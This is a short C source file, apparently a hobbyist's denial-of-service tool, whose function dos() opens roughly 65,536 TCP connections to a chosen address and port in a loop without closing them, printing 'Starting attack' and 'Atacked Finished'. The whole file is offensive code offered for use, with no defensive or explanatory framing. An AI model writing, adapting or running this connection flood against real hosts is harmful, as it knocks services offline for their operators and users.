/*
 ============================================================================
 Name        : SocketInC.c
 Author      : Igor Souza
 Version     :
 Copyright   : Your copyright notice
 Description : Denial of Service
 ============================================================================
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>



int dos(char address[], int port)
{



	int i=0;
	struct sockaddr_in target;
	int tcp_socket;
	int connection=0;
	printf("\Starting attack against %s ....\n", address);
	for (i = 0; i <= 0xffff; ++i)
	{


		tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
		if(tcp_socket == -1 )
		{
			fprintf(stderr,"%s:%d : ", __FILE__, __LINE__);
			fprintf(stderr, "Socket creation failed!!!\n");
			return -1;
		}

//		printf( "\nPort %d is", i);
		memset(&target, 0x00, sizeof(target));
		target.sin_family = AF_INET;
		target.sin_addr.s_addr = inet_addr(address);
		target.sin_port = htons( port);
		connection = connect(tcp_socket,(struct sockaddr *) &target, sizeof(target));

//		close(tcp_socket);
	}

	printf("\nAtacked Finished!!!");
	return 0;
}
